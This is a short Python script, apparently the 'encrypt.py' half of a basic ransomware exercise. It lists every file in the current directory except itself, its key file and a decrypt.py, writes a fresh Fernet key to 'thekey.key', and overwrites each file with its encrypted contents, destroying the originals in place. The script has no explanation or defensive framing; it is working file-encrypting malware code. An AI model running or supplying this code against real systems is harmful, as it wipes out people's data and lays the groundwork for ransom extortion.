#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":  ## ignore self
        continue
    if os.path.isfile(file): ## ignore folders
        files.append(file)

    
print(files)

#create a key
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
    
    
for file in files:
    #read files and store to variable
    with open(file, "rb") as thefile:
        contents = thefile.read()
    #encrypt the files
    contents_encrypted = Fernet(key).encrypt(contents)
    #write the encrypted contents back to the files
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)